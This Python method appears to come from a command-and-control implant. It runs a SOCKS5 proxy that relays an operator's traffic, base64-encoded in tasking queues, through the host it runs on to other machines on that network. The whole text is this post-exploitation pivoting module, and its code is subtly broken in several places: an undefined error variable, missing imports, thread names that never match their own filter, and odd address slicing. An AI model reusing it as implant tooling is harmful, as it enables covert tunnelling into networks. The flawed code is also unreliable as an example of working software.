    def socks(self, task_id, action, port):
        import socket, select, queue
        from threading import Thread, active_count
        from struct import pack, unpack
        
        MAX_THREADS = 200
        BUFSIZE = 2048
        TIMEOUT_SOCKET = 5
        OUTGOING_INTERFACE = ""

        VER = b'\x05'
        M_NOAUTH = b'\x00'
        M_NOTAVAILABLE = b'\xff'
        CMD_CONNECT = b'\x01'
        ATYP_IPV4 = b'\x01'
        ATYP_DOMAINNAME = b'\x03'

        SOCKS_SLEEP_INTERVAL = 0.1
        QUEUE_TIMOUT = 1

        def sendSocksPacket(server_id, data, exit_value):
            self.socks_out.put({ "server_id": server_id, 
                "data": base64.b64encode(data).decode(), "exit": exit_value })
            
        def create_socket():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(TIMEOUT_SOCKET)
            except: return "Failed to create socket: {}".format(str(err))
            return sock

        def connect_to_dst(dst_addr, dst_port):
            sock = create_socket()
            if OUTGOING_INTERFACE:
                try:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, OUTGOING_INTERFACE.encode())
                except PermissionError as err: return 0
            try:
                sock.connect((dst_addr, dst_port))
                return sock
            except socket.error as err: return 0

        def request_client(msg):
            try:
                message = base64.b64decode(msg["data"])
                s5_request = message[:BUFSIZE]
            except:
                return False
            if (s5_request[0:1] != VER or s5_request[1:2] != CMD_CONNECT or s5_request[2:3] != b'\x00'):
                return False
            if s5_request[3:4] == ATYP_IPV4:
                dst_addr = socket.inet_ntoa(s5_request[4:-2])
                dst_port = unpack('>H', s5_request[8:len(s5_request)])[0]
            elif s5_request[3:4] == ATYP_DOMAINNAME:
                sz_domain_name = s5_request[4]
                dst_addr = s5_request[5: 5 + sz_domain_name - len(s5_request)]
                port_to_unpack = s5_request[5 + sz_domain_name:len(s5_request)]
                dst_port = unpack('>H', port_to_unpack)[0]
            else: return False
            return (dst_addr, dst_port)

        def create_connection(msg):
            dst = request_client(msg)
            rep = b'\x07'
            bnd = b'\x00' + b'\x00' + b'\x00' + b'\x00' + b'\x00' + b'\x00'
            if dst: 
                socket_dst = connect_to_dst(dst[0], dst[1])
            if not dst or socket_dst == 0: rep = b'\x01'
            else:
                rep = b'\x00'
                bnd = socket.inet_aton(socket_dst.getsockname()[0])
                bnd += pack(">H", socket_dst.getsockname()[1])
            reply = VER + rep + b'\x00' + ATYP_IPV4 + bnd
            try: sendSocksPacket(msg["server_id"], reply, msg["exit"])                
            except: return
            if rep == b'\x00': return socket_dst

        def get_running_socks_thread():
            return [ t for t in threading.enumerate() if "socks:" in t.name and not task_id in t.name ]

        def a2m(server_id, socket_dst):
            while True:
                if task_id not in [task["task_id"] for task in self.taskings]: return
                elif [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]: return
                if server_id not in self.socks_open.keys(): return
                try: reader, _, _ = select.select([socket_dst], [], [], 1)
                except select.error as err: return

                if not reader: continue
                try:
                    for sock in reader:
                        data = sock.recv(BUFSIZE)
                        if not data:
                            sendSocksPacket(server_id, b"", True)
                            socket_dst.close()
                            return
                        sendSocksPacket(server_id, data, False)
                except Exception as e: pass
                time.sleep(SOCKS_SLEEP_INTERVAL)

        def m2a(server_id, socket_dst):
            while True:
                if task_id not in [task["task_id"] for task in self.taskings]: return
                elif [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]: return                
                if server_id not in self.socks_open.keys():
                    socket_dst.close()
                    return
                try:
                    if not self.socks_open[server_id].empty():
                        socket_dst.send(base64.b64decode(self.socks_open[server_id].get(timeout=QUEUE_TIMOUT)))
                except: pass
                time.sleep(SOCKS_SLEEP_INTERVAL)

        t_socks = get_running_socks_thread()

        if action == "start":
            if len(t_socks) > 0: return "[!] SOCKS Proxy already running."
            self.sendTaskOutputUpdate(task_id, "[*] SOCKS Proxy started.\n")
            while True:
                if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                    return "[*] SOCKS Proxy stopped."
                if not self.socks_in.empty():
                    packet_json = self.socks_in.get(timeout=QUEUE_TIMOUT)
                    if packet_json:
                        server_id = packet_json["server_id"]
                        if server_id in self.socks_open.keys():
                            if packet_json["data"]: 
                                self.socks_open[server_id].put(packet_json["data"])
                            elif packet_json["exit"]:
                                self.socks_open.pop(server_id)
                        else:
                            if not packet_json["exit"]:    
                                if active_count() > MAX_THREADS:
                                    sleep(3)
                                    continue
                                self.socks_open[server_id] = queue.Queue()
                                sock = create_connection(packet_json)
                                if sock:
                                    send_thread = Thread(target=a2m, args=(server_id, sock, ), name="a2m:{}".format(server_id))
                                    recv_thread = Thread(target=m2a, args=(server_id, sock, ), name="m2a:{}".format(server_id))
                                    send_thread.start()
                                    recv_thread.start()
                time.sleep(SOCKS_SLEEP_INTERVAL)
        else:
            if len(t_socks) > 0:
                for t_sock in t_socks:
                    task = [task for task in self.taskings if task["task_id"] == t_sock.name.split(":")[1]][0]
                    task["stopped"] = task["completed"] = True
                self.socks_open = {}
